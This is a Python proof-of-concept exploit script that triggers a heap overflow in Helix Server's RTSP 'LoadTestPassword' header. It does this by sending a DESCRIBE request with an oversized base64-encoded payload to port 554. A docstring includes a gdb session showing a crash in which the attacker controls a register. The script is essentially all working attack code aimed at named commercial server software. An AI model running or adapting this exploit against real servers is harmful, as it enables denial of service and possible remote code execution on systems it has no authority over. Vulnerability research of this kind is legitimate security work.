#!/usr/bin/env python
# helix_exp1.py
#
# Copyright (c) 2006-2007 Evgeny Legerov
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.


import sys
import socket
import struct
import base64

"""
It is very easy to exploit this bug if your connection to a server is the first
connection since the server's start.
Example:

Run Helix Server:
# ./Bin/rmserver --acd --nca --nar rmserver.cfg

Run this script:
$ python helix_exp1.py localhost 554
# gdb -q ./Bin/rmserver  core.6017
(no debugging symbols found)
Using host libthread_db library "/lib/libthread_db.so.1".
Reading symbols from shared object read from target memory...(no debugging
symbols found)...done.
Loaded system supplied DSO at 0x9da000
Core was generated by `./Bin/rmserver --acd --nar --nca rmserver.cfg'.
Program terminated with signal 11, Segmentation fault.
...
...
Reading symbols from /var/helix/Plugins/qtbcplin.so...
(no debugging symbols found)...done.
Loaded symbols for /var/helix/Plugins/qtbcplin.so
Reading symbols from /var/helix/Plugins/encoplin.so...(no debugging symbols
found)...done.
Loaded symbols for /var/helix/Plugins/encoplin.so
#0  0x082b299b in ClientStats::SetLoadTestPassword ()
(gdb) bt
#0  0x082b299b in ClientStats::SetLoadTestPassword ()
#1  0x08181dc8 in RTSPProtocol::RegisterPlayerOptions ()
#2  0x08182cf0 in RTSPProtocol::HandleStreamDescriptionRequest ()
#3  0x0819d3e1 in RTSPServerProtocol::OnDescribeRequest ()
#4  0x0819ba36 in RTSPServerProtocol::DispatchMessage ()
#5  0x0819bff0 in RTSPServerProtocol::handleInput ()
#6  0x0819c20f in RTSPServerProtocol::ReadDone ()
#7  0x08188dc3 in RTSPServerProtocol::EventPending ()
#8  0x08266fab in CHXSocket::OnEvent ()
#9  0x0816f994 in CHXServSocket::OnEvent ()
#10 0x0816eaea in CServSockCB::Func ()
#11 0x08166e82 in Callbacks::invoke_one_ts ()
#12 0x08164d8c in ServerEngine::mainloop ()
#13 0x081496a8 in PthreadEntryPoint ()
#14 0x00000000 in ?? ()
(gdb) x/i $eip
0x82b299b <_ZN11ClientStats19SetLoadTestPasswordEP9IHXBuffer+43>:       call
*0x4(%eax)
(gdb) i r eax
eax            0x41414141       1094795585
"""
def main():
        print "Trigger for Helix Server 'LoadTestPassword' heap overflow"
        print "Tested with Helix Server 11.1.2 (11.1.2.1597) (Build 110528/8091)
running Fedora Core Linux"

        if len(sys.argv) < 2:
                print "\nUsage: %s host" % sys.argv[0]
                print "Example: %s localhost\n" %sys.argv[0]
                return

        host = sys.argv[1]
        port = 554

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))

        s = "DESCRIBE rtsp://%s:%d/asdf.mp3 RTSP/1.0\r\n"%(host,port)
        s += "LoadTestPassword: %srrr\r\n" %
(base64.encodestring("A"*5000).replace("\n",""))
        s += "\r\n"

        sock.sendall(s)
        sock.close()

        print "Done"

if __name__=="__main__":
        sys.exit(main())

